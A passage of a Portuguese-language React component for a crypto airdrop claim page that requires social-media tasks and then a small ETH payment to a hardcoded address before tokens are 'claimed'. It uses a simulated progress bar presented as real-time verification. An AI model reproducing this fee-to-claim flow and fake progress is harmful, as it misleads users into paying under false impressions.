"use client"

import type React from "react"

import { useState, useEffect, useRef, useCallback } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { useToast } from "@/components/ui/use-toast"
import { Twitter, Send, CheckCircle, Clock, ExternalLink, Copy, AlertCircle, Heart, Shield, Wallet } from "lucide-react"
import Link from "next/link"
import { Progress } from "@/components/ui/progress"
import SuccessModal from "./success-modal"
import ConfettiEffect from "./confetti-effect"
import {
  verifyTwitterFollow,
  verifyTwitterRetweet,
  verifyTwitterLike,
  verifyTelegramJoin,
  verifyAllTasks,
} from "./verification-api"
import { sendTransaction, isMetaMaskInstalled, checkTransactionStatus } from "@/lib/ethers-utils"
import { recordClaim, hasClaimedTokens } from "@/lib/claim-storage"

interface AirdropTasksProps {
  walletAddress: string
  walletType: string
  onTasksCompleted?: (completed: boolean) => void
  referredBy?: string | null
}

interface Task {
  id: string
  title: string
  description: string
  icon: React.ReactNode
  completed: boolean
  locked: boolean
  verifying: boolean
  error: string | null
}

export default function AirdropTasks({ walletAddress, walletType, onTasksCompleted, referredBy }: AirdropTasksProps) {
  const { toast } = useToast()
  const [twitterUsername, setTwitterUsername] = useState("")
  const [retweetLink, setRetweetLink] = useState("")
  const [telegramId, setTelegramId] = useState("")
  const [verificationProgress, setVerificationProgress] = useState(0)
  const [isVerifying, setIsVerifying] = useState(false)
  const [isVerified, setIsVerified] = useState(false)
  const [verificationFailed, setVerificationFailed] = useState(false)
  const [failedTaskId, setFailedTaskId] = useState<string | null>(null)
  const [claimEnabled, setClaimEnabled] = useState(false)
  const [isProcessingPayment, setIsProcessingPayment] = useState(false)
  const [showSuccessModal, setShowSuccessModal] = useState(false)
  const [showConfetti, setShowConfetti] = useState(false)
  const [transactionHash, setTransactionHash] = useState<string | null>(null)
  const [tokenAmount, setTokenAmount] = useState(100) // Quantidade padrão de tokens
  const progressIntervalRef = useRef<NodeJS.Timeout | null>(null)
  const abortControllerRef = useRef<AbortController | null>(null)
  const tasksCompletedRef = useRef(false)
  const hasClaimedRef = useRef(false)
  const hasInitializedRef = useRef(false)
  const toastTimeoutRef = useRef<NodeJS.Timeout | null>(null)
  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null) // Referência para armazenar o intervalo de verificação de transação
  const [hasClaimed, setHasClaimed] = useState(false)
  const [internalIsConnected, setInternalIsConnected] = useState(false)

  // Callback para verificar se a carteira está conectada
  const checkWalletConnection = useCallback(() => {
    setInternalIsConnected(!!walletAddress)
  }, [walletAddress])

  // Inicialização segura - executada apenas uma vez
  useEffect(() => {
    if (!hasInitializedRef.current && walletAddress) {
      hasInitializedRef.current = true

      // Verificar se a carteira já reivindicou tokens
      const claimed = hasClaimedTokens(walletAddress)
      hasClaimedRef.current = claimed
      setHasClaimed(claimed)

      // Definir o valor do token com base no referral
      if (referredBy) {
        setTokenAmount(110) // 10% de bônus para referidos
      }
    }
  }, [walletAddress, referredBy])

  useEffect(() => {
    if (hasClaimed) {
      toast({
        title: "Reivindicação já realizada",
        description: "Esta carteira já reivindicou tokens anteriormente.",
        variant: "default",
        className: "bg-yellow-950 border-yellow-800 text-yellow-100",
      })
    }
  }, [hasClaimed, toast])

  const [tasks, setTasks] = useState<Task[]>([
    {
      id: "twitter-follow",
      title: "Seguir no Twitter",
      description: "Siga @aniresbank",
      icon: <Twitter className="h-5 w-5 text-blue-400" />,
      completed: false,
      locked: false,
      verifying: false,
      error: null,
    },
    {
      id: "twitter-retweet",
      title: "Retweet com Hashtags",
      description: "Faça um quote retweet do tweet do AniRes com as hashtags",
      icon: <Twitter className="h-5 w-5 text-blue-400" />,
      completed: false,
      locked: true,
      verifying: false,
      error: null,
    },
    {
      id: "twitter-like",
      title: "Curtir no Twitter",
      description: "Curta o tweet do AniRes",
      icon: <Heart className="h-5 w-5 text-red-400" />,
      completed: false,
      locked: true,
      verifying: false,
      error: null,
    },
    {
      id: "telegram-join",
      title: "Entrar no Grupo do Telegram",
      description: "Entre no grupo do Telegram do AniRes e obtenha seu ID",
      icon: <Send className="h-5 w-5 text-blue-400" />,
      completed: false,
      locked: true,
      verifying: false,
      error: null,
    },
  ])

  // Usar useEffect para verificar se todas as tarefas estão completas
  // e chamar o callback onTasksCompleted de forma segura
  useEffect(() => {
    const allCompleted = tasks.every((task) => task.completed)

    // Apenas notificar se o estado mudou para evitar chamadas desnecessárias
    if (allCompleted !== tasksCompletedRef.current) {
      tasksCompletedRef.current = allCompleted

      // Usar setTimeout para garantir que a atualização não ocorra durante a renderização
      if (onTasksCompleted) {
        setTimeout(() => {
          onTasksCompleted(allCompleted)
        }, 0)
      }
    }
  }, [tasks, onTasksCompleted])

  const updateTaskState = (taskId: string, updates: Partial<Task>) => {
    setTasks((prevTasks) => {
      const taskIndex = prevTasks.findIndex((t) => t.id === taskId)
      if (taskIndex === -1) return prevTasks

      const updatedTasks = [...prevTasks]
      updatedTasks[taskIndex] = { ...updatedTasks[taskIndex], ...updates }

      // Se a tarefa foi concluída, desbloquear a próxima
      if (updates.completed && taskIndex + 1 < updatedTasks.length) {
        updatedTasks[taskIndex + 1].locked = false
      }

      return updatedTasks
    })
  }

  const handleTwitterFollowVerification = async () => {
    if (!twitterUsername) {
      toast({
        title: "Campo obrigatório",
        description: "Por favor, digite seu nome de usuário do Twitter",
        variant: "destructive",
      })
      return
    }

    // Remover @ do início do nome de usuário se existir
    const username = twitterUsername.startsWith("@") ? twitterUsername.substring(1) : twitterUsername

    // Atualizar estado para mostrar que está verificando
    updateTaskState("twitter-follow", { verifying: true, error: null })

    try {
      // Verificação em tempo real com a API
      const response = await verifyTwitterFollow(username, "aniresbank", walletAddress)

      if (response.success) {
        updateTaskState("twitter-follow", { completed: true, verifying: false })
        toast({
          title: "Seguidor verificado!",
          description: response.message,
          className: "bg-green-950 border-green-800 text-green-100",
        })
      } else {
        updateTaskState("twitter-follow", { verifying: false, error: response.message })
        toast({
          title: "Erro na verificação",
          description: response.message,
          variant: "destructive",
        })
      }
    } catch (error) {
      console.error("Erro ao verificar seguidor:", error)
      updateTaskState("twitter-follow", {
        verifying: false,
        error: "Erro ao verificar. Tente novamente.",
      })
      toast({
        title: "Erro na verificação",
        description: "Ocorreu um erro ao verificar. Por favor, tente novamente.",
        variant: "destructive",
      })
    }
  }

  const handleTwitterRetweetVerification = async () => {
    if (!retweetLink) {
      toast({
        title: "Campo obrigatório",
        description: "Por favor, cole o link do seu retweet",
        variant: "destructive",
      })
      return
    }

    // Validação mais robusta do link
    if (!retweetLink.match(/https?:\/\/(www\.)?(twitter|x)\.com\/[a-zA-Z0-9_]+\/status\/\d+/)) {
      toast({
        title: "Link inválido",
        description: "Por favor, forneça um link válido de retweet do Twitter/X",
        variant: "destructive",
      })
      return
    }

    // Atualizar estado para mostrar que está verificando
    updateTaskState("twitter-retweet", { verifying: true, error: null })

    try {
      // Verificação em tempo real com a API
      const response = await verifyTwitterRetweet(retweetLink, "1902540931510775987", walletAddress)

      if (response.success) {
        updateTaskState("twitter-retweet", { completed: true, verifying: false })
        toast({
          title: "Retweet verificado!",
          description: response.message,
          className: "bg-green-950 border-green-800 text-green-100",
        })
      } else {
        updateTaskState("twitter-retweet", { verifying: false, error: response.message })
        toast({
          title: "Erro na verificação",
          description: response.message,
          variant: "destructive",
        })
      }
    } catch (error) {
      console.error("Erro ao verificar retweet:", error)
      updateTaskState("twitter-retweet", {
        verifying: false,
        error: "Erro ao verificar. Tente novamente.",
      })
      toast({
        title: "Erro na verificação",
        description: "Ocorreu um erro ao verificar. Por favor, tente novamente.",
        variant: "destructive",
      })
    }
  }

  const handleTwitterLikeVerification = async () => {
    // Atualizar estado para mostrar que está verificando
    updateTaskState("twitter-like", { verifying: true, error: null })

    try {
      // Verificação em tempo real com a API
      const response = await verifyTwitterLike("1902540931510775987", walletAddress)

      if (response.success) {
        updateTaskState("twitter-like", { completed: true, verifying: false })
        toast({
          title: "Curtida verificada!",
          description: response.message,
          className: "bg-green-950 border-green-800 text-green-100",
        })
      } else {
        updateTaskState("twitter-like", { verifying: false, error: response.message })
        toast({
          title: "Erro na verificação",
          description: response.message,
          variant: "destructive",
        })
      }
    } catch (error) {
      console.error("Erro ao verificar curtida:", error)
      updateTaskState("twitter-like", {
        verifying: false,
        error: "Erro ao verificar. Tente novamente.",
      })
      toast({
        title: "Erro na verificação",
        description: "Ocorreu um erro ao verificar. Por favor, tente novamente.",
        variant: "destructive",
      })
    }
  }

  const handleTelegramJoinVerification = async () => {
    if (!telegramId) {
      toast({
        title: "Campo obrigatório",
        description: "Por favor, digite seu ID do Telegram",
        variant: "destructive",
      })
      return
    }

    // Validação mais robusta do ID do Telegram
    if (!/^\d{6,15}$/.test(telegramId)) {
      toast({
        title: "ID inválido",
        description: "O ID do Telegram deve conter entre 6 e 15 números",
        variant: "destructive",
      })
      return
    }

    // Atualizar estado para mostrar que está verificando
    updateTaskState("telegram-join", { verifying: true, error: null })

    try {
      // Verificação em tempo real com a API
      const response = await verifyTelegramJoin(telegramId, "+n3W_3F75YKhiZGRh", walletAddress)

      if (response.success) {
        updateTaskState("telegram-join", { completed: true, verifying: false })
        toast({
          title: "Participação verificada!",
          description: response.message,
          className: "bg-green-950 border-green-800 text-green-100",
        })
      } else {
        updateTaskState("telegram-join", { verifying: false, error: response.message })
        toast({
          title: "Erro na verificação",
          description: response.message,
          variant: "destructive",
        })
      }
    } catch (error) {
      console.error("Erro ao verificar participação no Telegram:", error)
      updateTaskState("telegram-join", {
        verifying: false,
        error: "Erro ao verificar. Tente novamente.",
      })
      toast({
        title: "Erro na verificação",
        description: "Ocorreu um erro ao verificar. Por favor, tente novamente.",
        variant: "destructive",
      })
    }
  }

  const handleStartVerification = async () => {
    // Verificar se todas as tarefas foram concluídas
    if (!tasks.every((task) => task.completed)) {
      toast({
        title: "Tarefas incompletas",
        description: "Complete todas as tarefas antes de iniciar a verificação",
        variant: "destructive",
      })
      return
    }

    setIsVerifying(true)
    setVerificationProgress(0)
    setVerificationFailed(false)
    setFailedTaskId(null)

    // Limpar qualquer intervalo anterior
    if (progressIntervalRef.current) {
      clearInterval(progressIntervalRef.current)
    }

    try {
      // Iniciar verificação em tempo real de todas as tarefas
      const response = await verifyAllTasks(tasks, walletAddress)

      if (response.success) {
        // Simular progresso para uma melhor experiência do usuário
        const totalVerificationTime = 15 // segundos
        const updateInterval = 300 // milissegundos
        const incrementPerUpdate = (100 * updateInterval) / (totalVerificationTime * 1000)

        progressIntervalRef.current = setInterval(() => {
          setVerificationProgress((prev) => {
            const newProgress = Math.min(prev + incrementPerUpdate, 100)

            // Verificação completa
            if (newProgress >= 100) {
              if (progressIntervalRef.current) {
                clearInterval(progressIntervalRef.current)
                progressIntervalRef.current = null
              }
              setIsVerifying(false)
              setIsVerified(true)
              setClaimEnabled(true)

              // Notificar que todas as tarefas foram concluídas
              setTimeout(() => {
                toast({
                  title: "Verificação concluída!",
                  description:
                    "Todas as tarefas foram verificadas com sucesso. Você pode reivindicar seus tokens agora.",
                  className: "bg-green-950 border-green-800 text-green-100",
                })
              }, 100)

              return 100
            }

            return newProgress
          })
        }, updateInterval)
      } else {
        // Falha na verificação
        setIsVerifying(false)
        setVerificationFailed(true)
        setFailedTaskId(response.taskId || null)

        toast({
          title: "Verificação falhou",
          description: response.message,
          variant: "destructive",
        })
      }
    } catch (error) {
      console.error("Erro ao iniciar verificação:", error)
      setIsVerifying(false)
      setVerificationFailed(true)

      toast({
        title: "Erro na verificação",
        description: "Ocorreu um erro ao verificar as tarefas. Por favor, tente novamente.",
        variant: "destructive",
      })
    }
  }

  const handleProcessPayment = async () => {
    if (!isVerified) {
      toast({
        title: "Verificação necessária",
        description: "Complete a verificação antes de reivindicar tokens",
        variant: "destructive",
      })
      return
    }

    // Verificar si a carteira já reivindicou tokens
    if (hasClaimedTokens(walletAddress)) {
      toast({
        title: "Reivindicação já realizada",
        description: "Esta carteira já reivindicou tokens anteriormente.",
        variant: "destructive",
      })
      return
    }

    setIsProcessingPayment(true)

    try {
      toast({
        title: "Processando pagamento",
        description: "Sua carteira será aberta para autorizar o pagamento de 0.000006 ETH",
        className: "bg-blue-950 border-blue-800 text-blue-100",
      })

      // Verificar se o MetaMask está instalado
      if (isMetaMaskInstalled()) {
        try {
          // Endereço do contrato para pagamento
          const toAddress = "0x0Fcf41A546b2de64aBDc320703dDD657dF802Eb4"
          const amountInEth = "0.000006"

          // Enviar transação
          const txHash = await sendTransaction(toAddress, amountInEth)
          setTransactionHash(txHash)

          console.log("Transação enviada:", txHash)

          // Aguardar confirmação da transação
          toast({
            title: "Transação enviada",
            description: "Aguardando confirmação da transação...",
            className: "bg-blue-950 border-blue-800 text-blue-100",
          })

          // Verificar status da transação a cada 3 segundos
          let attempts = 0

          // Limpar qualquer intervalo anterior
          if (checkIntervalRef.current) {
            clearInterval(checkIntervalRef.current)
          }

          checkIntervalRef.current = setInterval(async () => {
            try {
              attempts++
              const status = await checkTransactionStatus(txHash)
              if (status) {
                if (checkIntervalRef.current) {
                  clearInterval(checkIntervalRef.current)
                  checkIntervalRef.current = null
                }

                // Continuar com o processo após confirmação
                // Registrar a reivindicação no sistema
                recordClaim(walletAddress, tokenAmount, txHash, referredBy || undefined)

                // Mostrar modal de sucesso e confetes
                setShowSuccessModal(true)
                setShowConfetti(true)

                // Notificar administradores via WhatsApp
                try {
                  console.log("Enviando notificação para administradores...")

                  // Construir URL com parâmetros de consulta para garantir que os dados sejam recebidos
                  const params = new URLSearchParams()
                  params.append("walletAddress", walletAddress)
                  params.append("twitterUsername", twitterUsername || "")
                  params.append("telegramId", telegramId || "")
                  params.append("tokenAmount", tokenAmount.toString())
                  params.append("transactionHash", txHash)
                  if (referredBy) params.append("referredBy", referredBy)

                  // Adicionar timestamp para evitar cache
                  params.append("timestamp", new Date().toISOString())

                  // Construir a URL completa para a notificação
                  const notificationUrl = `/api/notify-claim?${params.toString()}`
                  console.log("URL de notificação:", notificationUrl)

                  // Fazer até 3 tentativas de envio da notificação
                  let notificationSuccess = false
                  attempts = 0

                  while (!notificationSuccess && attempts < 3) {
                    try {
                      attempts++
                      console.log(`Tentativa ${attempts} de enviar notificação...`)

                      // Usar GET para garantir que os parâmetros sejam processados corretamente
                      const notificationResponse = await fetch(notificationUrl, {
                        method: "GET",
                        headers: {
                          "Cache-Control": "no-cache, no-store",
                          Pragma: "no-cache",
                        },
                      })

                      console.log("Status da resposta:", notificationResponse.status)
                      const responseData = await notificationResponse.json()
                      console.log("Resposta completa:", responseData)

                      if (notificationResponse.ok && responseData.success) {
                        notificationSuccess = true
                        console.log("Notificação enviada com sucesso!")
                      } else {
                        console.warn(`Falha na tentativa ${attempts}:`, responseData)
                        // Esperar antes da próxima tentativa
                        if (attempts < 3) await new Promise((resolve) => setTimeout(resolve, 1000 * attempts))
                      }
                    } catch (attemptError) {
                      console.error(`Erro na tentativa ${attempts}:`, attemptError)
                      // Esperar antes da próxima tentativa
                      if (attempts < 3) await new Promise((resolve) => setTimeout(resolve, 1000 * attempts))
                    }
                  }

                  // Se todas as tentativas falharem, tentar o método alternativo
                  if (!notificationSuccess) {
                    console.log("Todas as tentativas falharam, tentando método alternativo...")

                    // Tentar a API de fallback
                    const fallbackUrl = `/api/send-whatsapp?walletAddress=${encodeURIComponent(walletAddress)}&message=${encodeURIComponent(
                      `Nova reivindicação: ${walletAddress} (${tokenAmount} tokens) - TX: ${txHash}`,
                    )}`

                    const fallbackResponse = await fetch(fallbackUrl, {
                      method: "GET",
                      headers: {
                        "Cache-Control": "no-cache, no-store",
                        Pragma: "no-cache",
                      },
                    })

                    console.log("Status da resposta de fallback:", fallbackResponse.status)
                    const fallbackData = await fallbackResponse.json()
                    console.log("Resposta de fallback completa:", fallbackData)

                    // Última tentativa - API direta
                    if (!fallbackResponse.ok) {
                      const directUrl = `/api/direct-notify?walletAddress=${encodeURIComponent(walletAddress)}&message=${encodeURIComponent(
                        `Nova reivindicação: ${walletAddress} (${tokenAmount} tokens) - TX: ${txHash}`,
                      )}`

                      await fetch(directUrl, { method: "GET" })
                      console.log("Tentativa direta enviada")
                    }
                  }
                } catch (notifyError) {
                  console.error("Erro ao enviar notificação:", notifyError)
                }
              }

              if (attempts >= 10) {
                if (checkIntervalRef.current) {
                  clearInterval(checkIntervalRef.current)
                  checkIntervalRef.current = null
                }
                console.log("Número máximo de tentativas atingido")
              }
            } catch (error) {
              console.error("Erro ao verificar status da transação:", error)
              if (attempts >= 10 && checkIntervalRef.current) {
                clearInterval(checkIntervalRef.current)
                checkIntervalRef.current = null
              }
            }
          }, 3000)
        } catch (error) {
          console.error("Erro na transação:", error)
          toast({
            title: "Erro na transação",
            description: "Ocorreu um erro ao processar o pagamento. Por favor, tente novamente.",
            variant: "destructive",
          })
        }
      } else {
        // Fallback para navegadores sem MetaMask
        toast({
          title: "MetaMask não detectado",
          description: "Por favor, instale a extensão MetaMask para continuar.",
          variant: "destructive",
        })
      }
    } catch (error) {
      console.error("Erro ao processar pagamento:", error)
      toast({
        title: "Erro no pagamento",
        description: "Ocorreu um erro ao processar o pagamento. Por favor, tente novamente.",
        variant: "destructive",
      })
    } finally {
      setIsProcessingPayment(false)
    }
  }

  useEffect(() => {
    // Verificar se a carteira já reivindicou tokens ao montar o componente
    if (walletAddress) {
      const claimed = hasClaimedTokens(walletAddress)
      hasClaimedRef.current = claimed
      setHasClaimed(claimed)
    }

    // Efeito de limpeza
    return () => {
      // Limpar intervalos
      if (progressIntervalRef.current) {
        clearInterval(progressIntervalRef.current)
        progressIntervalRef.current = null
      }

      // Limpar o intervalo de verificação de transação
      if (checkIntervalRef.current) {
        clearInterval(checkIntervalRef.current)
        checkIntervalRef.current = null
      }

      // Limpar controladores de aborto
      if (abortControllerRef.current) {
        abortControllerRef.current.abort()
        abortControllerRef.current = null
      }

      // Limpar timeouts
      if (toastTimeoutRef.current) {
        clearTimeout(toastTimeoutRef.current)
        toastTimeoutRef.current = null
      }
    }
  }, [walletAddress])

  const hashtags =
    "#airdrop #Dogecoin #eth #ShibaInu #mainnet #pepecoin #web3 #crypto #arbitrum #OFFICIALTRUMP #memecoins #StreetDogCoin #TieBank #CryptoForACause #DogAdoption #BlockchainForGood #CryptoWithPurpose #SupportAnimalRescue #DogRescue #AniRes #AniResBank"

  const copyToClipboard = (text: string, message: string) => {
    navigator.clipboard
      .writeText(text)
      .then(() => {
        toast({
          title: "Copiado!",
          description: message,
          className: "bg-green-950 border-green-800 text-green-100",
        })
      })
      .catch((err) => {
        console.error("Erro ao copiar: ", err)
        toast({
          title: "Erro ao copiar",
          description: "Não foi possível copiar o texto",
          variant: "destructive",
        })
      })
  }

  // Verificar se a carteira está conectada
  useEffect(() => {
    if (walletAddress) {
      setInternalIsConnected(true)
    } else {
      setInternalIsConnected(false)
    }
  }, [walletAddress])

  if (!internalIsConnected) {
    return (
      <div className="space-y-6">
        <Card className="border-purple-800/30 bg-[#0e0e1a] shadow-xl overflow-hidden">
          <CardContent className="p-6">
            <div className="flex flex-col items-center justify-center text-center space-y-4">
              <Wallet className="h-12 w-12 text-purple-400" />
              <h2 className="text-xl font-semibold text-white">Conecte sua carteira</h2>
              <p className="text-gray-400">
                Para participar do airdrop e reivindicar seus tokens, você precisa conectar sua carteira primeiro.
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="space-y-6">
      {showConfetti && <ConfettiEffect duration={8000} />}

      {showSuccessModal && (
        <SuccessModal
          isOpen={showSuccessModal}
          onClose={() => setShowSuccessModal(false)}
          walletAddress={walletAddress}
          tokenAmount={tokenAmount}
        />
      )}

      <div className="text-left mb-2">
        <h2 className="text-xl text-purple-400 font-semibold">Tarefas de Participação</h2>
        <p className="text-gray-400 text-sm">
          Siga estas etapas para participar do airdrop Street Dog Coin e ter a chance de receber tokens gratuitos.
        </p>
      </div>

      {/* Task 1: Follow on Twitter */}
      <Card
        className={`border-purple-800/30 bg-[#0e0e1a] shadow-xl overflow-hidden ${tasks[0].locked ? "opacity-70" : ""}`}
      >
        <CardHeader className="border-b border-purple-900/20 bg-[#0a0a14] py-3 px-4">
          <div className="flex items-center">
            <Twitter className="h-5 w-5 text-blue-400" />
            <CardTitle className="text-base text-purple-400 ml-2">Seguir no Twitter</CardTitle>
          </div>
        </CardHeader>
        <CardContent className="p-4">
          <p className="text-sm text-gray-300 mb-3">Siga @aniresbank</p>

          <div className="mb-3">
            <Link
              href="https://x.com/aniresbank"
              target="_blank"
              className="text-blue-400 hover:underline text-sm flex items-center"
            >
              <ExternalLink className="h-4 w-4 mr-1" />
              Seguir @aniresbank
            </Link>
          </div>

          <div className="flex flex-col space-y-3">
            <div>
              <label htmlFor="twitter-username" className="text-sm text-gray-400 mb-1 block">
                Digite seu nome de usuário do Twitter
              </label>
              <div className="flex gap-2">
                <Input
                  id="twitter-username"
                  placeholder="@seuusuario"
                  value={twitterUsername}
                  onChange={(e) => setTwitterUsername(e.target.value)}
                  className="bg-[#13131f] border-purple-800/30 text-white"
                  disabled={tasks[0].completed || tasks[0].locked || tasks[0].verifying}
                />
                {tasks[0].completed ? (
                  <div className="flex items-center text-green-400 text-sm px-3 border border-green-800/30 rounded-md bg-green-900/20">
                    <CheckCircle className="h-4 w-4 mr-1" />
                    <span>Verificado</span>
                  </div>
                ) : tasks[0].verifying ? (
                  <div className="flex items-center text-yellow-400 text-sm px-3 border border-yellow-800/30 rounded-md bg-yellow-900/20">
                    <Clock className="h-4 w-4 mr-1 animate-spin" />
                    <span>Verificando...</span>
                  </div>
                ) : (
                  <Button
                    onClick={handleTwitterFollowVerification}
                    className="bg-purple-600 hover:bg-purple-700 text-white"
                    disabled={tasks[0].locked}
                  >
                    Verificar
                  </Button>
                )}
              </div>
              {tasks[0].error && <p className="text-red-400 text-xs mt-1">{tasks[0].error}</p>}
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Task 2: Retweet with hashtags */}
      <Card
        className={`border-purple-800/30 bg-[#0e0e1a] shadow-xl overflow-hidden ${tasks[1].locked ? "opacity-70" : ""}`}
      >
        <CardHeader className="border-b border-purple-900/20 bg-[#0a0a14] py-3 px-4">
          <div className="flex items-center">
            <Twitter className="h-5 w-5 text-blue-400" />
            <CardTitle className="text-base text-purple-400 ml-2">Retweet com Hashtags</CardTitle>
          </div>
        </CardHeader>
        <CardContent className="p-4">
          <p className="text-sm text-gray-300 mb-3">Faça um quote retweet do tweet do AniRes com as hashtags</p>

          <div className="mb-3 p-3 bg-[#13131f] rounded-md border border-purple-800/30">
            <p className="text-xs text-gray-300 mb-2 break-words">{hashtags}</p>
            <Button
              variant="outline"
              size="sm"
              className="border-purple-800/30 text-purple-400 hover:bg-purple-900/20"
              onClick={() => copyToClipboard(hashtags, "Hashtags copiadas para a área de transferência")}
              disabled={tasks[1].locked}
            >
              <Copy className="h-3 w-3 mr-1" />
              Copiar Hashtags
            </Button>
          </div>

          <div className="mb-3">
            <Link
              href="https://x.com/aniresbank/status/1902540931510775987"
              target="_blank"
              className="text-blue-400 hover:underline text-sm flex items-center"
              onClick={(e) => {
                if (tasks[1].locked) {
                  e.preventDefault()
                  toast({
                    title: "Tarefa bloqueada",
                    description: "Complete a tarefa anterior primeiro",
                    variant: "destructive",
                  })
                }
              }}
            >
              <ExternalLink className="h-4 w-4 mr-1" />
              Ver tweet para retweet
            </Link>
          </div>

          <div className="flex flex-col space-y-3">
            <div>
              <label htmlFor="retweet-link" className="text-sm text-gray-400 mb-1 block">
                Cole o link do seu retweet
              </label>
              <div className="flex gap-2">
                <Input
                  id="retweet-link"
                  placeholder="https://x.com/seu-usuario/status/123456789"
                  value={retweetLink}
                  onChange={(e) => setRetweetLink(e.target.value)}
                  className="bg-[#13131f] border-purple-800/30 text-white"
                  disabled={tasks[1].completed || tasks[1].locked || tasks[1].verifying}
                />
                {tasks[1].completed ? (
                  <div className="flex items-center text-green-400 text-sm px-3 border border-green-800/30 rounded-md bg-green-900/20">
                    <CheckCircle className="h-4 w-4 mr-1" />
                    <span>Verificado</span>
                  </div>
                ) : tasks[1].verifying ? (
                  <div className="flex items-center text-yellow-400 text-sm px-3 border border-yellow-800/30 rounded-md bg-yellow-900/20">
                    <Clock className="h-4 w-4 mr-1 animate-spin" />
                    <span>Verificando...</span>
                  </div>
                ) : (
                  <Button
                    onClick={handleTwitterRetweetVerification}
                    className="bg-purple-600 hover:bg-purple-700 text-white"
                    disabled={tasks[1].locked}
                  >
                    Verificar
                  </Button>
                )}
              </div>
              {tasks[1].error && <p className="text-red-400 text-xs mt-1">{tasks[1].error}</p>}
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Task 3: Like on Twitter */}
      <Card
        className={`border-purple-800/30 bg-[#0e0e1a] shadow-xl overflow-hidden ${tasks[2].locked ? "opacity-70" : ""}`}
      >
        <CardHeader className="border-b border-purple-900/20 bg-[#0a0a14] py-3 px-4">
          <div className="flex items-center">
            <Heart className="h-5 w-5 text-red-400" />
            <CardTitle className="text-base text-purple-400 ml-2">Curtir no Twitter</CardTitle>
          </div>
        </CardHeader>
        <CardContent className="p-4">
          <p className="text-sm text-gray-300 mb-3">Curta o tweet do AniRes</p>

          <div className="mb-3">
            <Link
              href="https://x.com/intent/like?tweet_id=1902540931510775987"
              target="_blank"
              className="text-blue-400 hover:underline text-sm flex items-center"
              onClick={(e) => {
                if (tasks[2].locked) {
                  e.preventDefault()
                  toast({
                    title: "Tarefa bloqueada",
                    description: "Complete a tarefa anterior primeiro",
                    variant: "destructive",
                  })
                }
              }}
            >
              <ExternalLink className="h-4 w-4 mr-1" />
              Curtir tweet
            </Link>
          </div>

          <div className="flex justify-end">
            {tasks[2].completed ? (
              <div className="flex items-center text-green-400 text-sm px-3 border border-green-800/30 rounded-md bg-green-900/20">
                <CheckCircle className="h-4 w-4 mr-1" />
                <span>Verificado</span>
              </div>
            ) : tasks[2].verifying ? (
              <div className="flex items-center text-yellow-400 text-sm px-3 border border-yellow-800/30 rounded-md bg-yellow-900/20">
                <Clock className="h-4 w-4 mr-1 animate-spin" />
                <span>Verificando...</span>
              </div>
            ) : (
              <Button
                onClick={handleTwitterLikeVerification}
                className="bg-purple-600 hover:bg-purple-700 text-white"
                disabled={tasks[2].locked}
              >
                Verificar Curtida
              </Button>
            )}
          </div>
          {tasks[2].error && <p className="text-red-400 text-xs mt-1">{tasks[2].error}</p>}
        </CardContent>
      </Card>

      {/* Task 4: Join Telegram */}
      <Card
        className={`border-purple-800/30 bg-[#0e0e1a] shadow-xl overflow-hidden ${tasks[3].locked ? "opacity-70" : ""}`}
      >
        <CardHeader className="border-b border-purple-900/20 bg-[#0a0a14] py-3 px-4">
          <div className="flex items-center">
            <Send className="h-5 w-5 text-blue-400" />
            <CardTitle className="text-base text-purple-400 ml-2">Entrar no Grupo do Telegram</CardTitle>
          </div>
        </CardHeader>
        <CardContent className="p-4">
          <p className="text-sm text-gray-300 mb-3">Entre no grupo do Telegram do AniRes e obtenha seu ID</p>

          <div className="mb-3">
            <Link
              href="https://t.me/+QjlsDJcarak3YTQ5"
              target="_blank"
              className="text-blue-400 hover:underline text-sm flex items-center mb-2"
              onClick={(e) => {
                if (tasks[3].locked) {
                  e.preventDefault()
                  toast({
                    title: "Tarefa bloqueada",
                    description: "Complete a tarefa anterior primeiro",
                    variant: "destructive",
                  })
                }
              }}
            >
              <ExternalLink className="h-4 w-4 mr-1" />
              Entrar no grupo do Telegram
            </Link>

            <Link
              href="https://t.me/userinfobot"
              target="_blank"
              className="text-blue-400 hover:underline text-sm flex items-center"
              onClick={(e) => {
                if (tasks[3].locked) {
                  e.preventDefault()
                  toast({
                    title: "Tarefa bloqueada",
                    description: "Complete a tarefa anterior primeiro",
                    variant: "destructive",
                  })
                }
              }}
            >
              <ExternalLink className="h-4 w-4 mr-1" />
              Obtenha seu ID de usuário do Telegram
            </Link>
          </div>

          <div className="flex flex-col space-y-3">
            <div>
              <label htmlFor="telegram-id" className="text-sm text-gray-400 mb-1 block">
                Digite seu ID do Telegram (ex: 6123567677)
              </label>
              <div className="flex gap-2">
                <Input
                  id="telegram-id"
                  placeholder="6123567677"
                  value={telegramId}
                  onChange={(e) => setTelegramId(e.target.value)}
                  className="bg-[#13131f] border-purple-800/30 text-white"
                  disabled={tasks[3].completed || tasks[3].locked || tasks[3].verifying}
                />
                {tasks[3].completed ? (
                  <div className="flex items-center text-green-400 text-sm px-3 border border-green-800/30 rounded-md bg-green-900/20">
                    <CheckCircle className="h-4 w-4 mr-1" />
                    <span>Verificado</span>
                  </div>
                ) : tasks[3].verifying ? (
                  <div className="flex items-center text-yellow-400 text-sm px-3 border border-yellow-800/30 rounded-md bg-yellow-900/20">
                    <Clock className="h-4 w-4 mr-1 animate-spin" />
                    <span>Verificando...</span>
                  </div>
                ) : (
                  <Button
                    onClick={handleTelegramJoinVerification}
                    className="bg-purple-600 hover:bg-purple-700 text-white"
                    disabled={tasks[3].locked}
                  >
                    Verificar
                  </Button>
                )}
              </div>
              {tasks[3].error && <p className="text-red-400 text-xs mt-1">{tasks[3].error}</p>}
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Verification Section */}
      <div className="text-left mt-8 mb-2">
        <h2 className="text-xl text-purple-400 font-semibold">Verificação de Tarefas</h2>
        <p className="text-gray-400 text-sm">
          Após completar todas as tarefas, inicie a verificação para habilitar a reivindicação do airdrop. Nosso sistema
          verificará em tempo real se você completou todas as tarefas necessárias. Este processo leva aproximadamente 30
          segundos.
        </p>
      </div>

      <Card className="border-purple-800/30 bg-[#0e0e1a] shadow-xl overflow-hidden">
        <CardContent className="p-4">
          {isVerifying && (
            <div className="mb-4">
              <div className="flex justify-between text-sm mb-1">
